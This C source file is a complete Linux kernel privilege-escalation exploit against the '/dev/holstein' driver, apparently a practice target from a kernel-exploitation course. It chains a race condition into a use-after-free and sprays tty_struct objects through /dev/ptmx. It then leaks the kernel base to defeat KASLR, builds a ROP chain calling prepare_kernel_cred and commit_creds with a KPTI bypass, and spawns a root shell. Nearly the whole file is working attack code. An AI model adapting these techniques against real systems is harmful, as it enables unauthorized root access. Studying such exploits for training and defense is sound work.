/**
 * Improved version of race-krop.c
 *
 * - Discards the candidate tty_struct when its leaked kernel base address is
 *   not completely page aligned.
 * - A `retry` flag is set to continue spraying until a valid tty_struct is
 *   obtained.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sched.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_tty_ops 0xc3afe0
#define rop_push_rdx_add_prbxP41h_bl_pop_rsp_pop_rbp (kbase + 0x137da6) // goal: mov rsp, rdx; ret;
#define rop_pop_rdi (kbase + 0x0b13c5)
#define rop_pop_rcx_rbx_rbp (kbase + 0x3006fc)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x65094b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x0723e0)
#define addr_prepare_kernel_cred (kbase + 0x072580)

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  write(1, "[+] win!\n", 9);
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

pid_t gettid(void) {
  return syscall(SYS_gettid);
}

int race_win = 0;
int fd1, fd2;

void* race(void *arg) {
  cpu_set_t *cpu_set = (cpu_set_t*)arg;
  if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    fatal("sched_setaffinity");

  while (1) {
    // Race until fd is 4 in any thread. Note that file descriptors are shared
    // among threads
    while (!race_win) {
      int fd = open("/dev/holstein", O_RDWR);
      if (fd == fd2) race_win = 1;
      if (race_win == 0 && fd != -1) close(fd);
    }

    // Confirm that the other thread did not close fd by accident
    if (write(fd1, "A", 1) != 1 || write(fd2, "A", 1) != 1) {
      // fail
      close(fd1);
      close(fd2);
      race_win = 0;
    } else {
      // success
      puts("[+] race win!");
      break;
    }
    usleep(1000);
  }

  return NULL;
}

void* spray_thread(void *arg) {
  cpu_set_t *cpu_set = (cpu_set_t*)arg;
  if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    fatal("sched_setaffinity");

  long x;
  long spray[800];

  for (int i = 0; i < 800; i++) {
    usleep(10);
    // tty_structのspray
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) {
      // Reached the maximum number of opened file descriptors without hitting
      // our freed buffer. Clean up and return failure
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void*)-1;
    }

    if (read(fd2, &x, sizeof(long)) == sizeof(long) && x) {
      // The buffer has been used for the new tty_struct, which will be our
      // victim. Close all previously opened file descriptors
      for (int j = 0; j < i; j++)
        close(spray[j]);
      return (void*)spray[i];
    }
  }

  // No success. Clean up and return failure
  for (int i = 0; i < 800; i++)
    close(spray[i]);
  return (void*)-1;
}

int create_overlapped() {
  pthread_t th1, th2;
  char buf[0x10] = {};
  cpu_set_t t1_cpu, t2_cpu;

  CPU_ZERO(&t1_cpu);
  CPU_ZERO(&t2_cpu);
  CPU_SET(0, &t1_cpu);
  CPU_SET(1, &t2_cpu);

  // Get next free file descriptor
  fd1 = open("/tmp", O_RDONLY); 
  fd2 = open("/tmp", O_RDONLY); 
  close(fd1);
  close(fd2);
  printf("[+] next fds: %d, %d\n", fd1, fd2);

  // race
  pthread_create(&th1, NULL, race, (void*)&t1_cpu);
  pthread_create(&th2, NULL, race, (void*)&t2_cpu);
  pthread_join(th1, NULL);
  pthread_join(th2, NULL);

  // Confirm that the race was successful
  write(fd1, "Hello, World!", 14);
  read(fd2, buf, 14);
  if (strcmp(buf, "Hello, World!") != 0) {
    puts("[-] Bad luck!");
    exit(1);
  }
  // Blank the buffer as it will be used determine the success of the spray
  memset(buf, 0, 14);
  write(fd1, buf, 14);

  // Free the buffer to create the use-after-free opportunity
  close(fd1);

  // Heap Spray on multiple cores
  long victim_fd = -1;
  // Try on CPU1
  victim_fd = (long)spray_thread((void*)&t1_cpu);
  // If CPU1 fails, try on CPU2
  while (victim_fd == -1) {
    puts("[+] spraying on another CPU...");
    pthread_create(&th1, NULL, spray_thread, (void*)&t2_cpu);
    pthread_join(th1, (void*)&victim_fd);
  }

  printf("[+] overlap OK: victim=%d\n", (int)victim_fd);
  return victim_fd;
}

int main() {
  char buf[0x400] = {};
  int victim_ptmx;
  int retry = 1;

  save_state();
  while (retry) {
    // Overlap tty_struct and fd2 in UAF
    victim_ptmx = create_overlapped();

    // KASLR bypass
    read(fd2, buf, 0x400);
    kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
    g_buf = *(unsigned long*)&buf[0x38] - 0x38;
    if (kbase & 0xfff) {
      puts("[-] Invalid leak! Try again ...");
      close(victim_ptmx);    
      continue;
    }
    retry = 0;
  }
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  // ROP chain
  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx_rbx_rbp;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;
  // fake tty_operations
  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_add_prbxP41h_bl_pop_rsp_pop_rbp;
  write(fd2, buf, 0x400);

  retry = 1;
  while (retry) {
    // Overlap tty_struct and fd2 in UAF
    victim_ptmx = create_overlapped();

    // Rewrite ->ops pointer
    read(fd2, buf, 0x20);
    // verify obtained tty_struct by checking its leaked base address
    if (kbase != *(unsigned long *)&buf[0x18] - ofs_tty_ops) {
      puts("[-] Invalid tty_struct! Try again ...");
      close(victim_ptmx); 
      continue;
    }
    retry = 0;
  }

  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd2, buf, 0x20);

  // RIP control
  ioctl(victim_ptmx, 0, /* rdx */ g_buf - 8); // rsp=rdx; pop rbp;
  puts("[-] Exploit failed...");

  return 0;
}
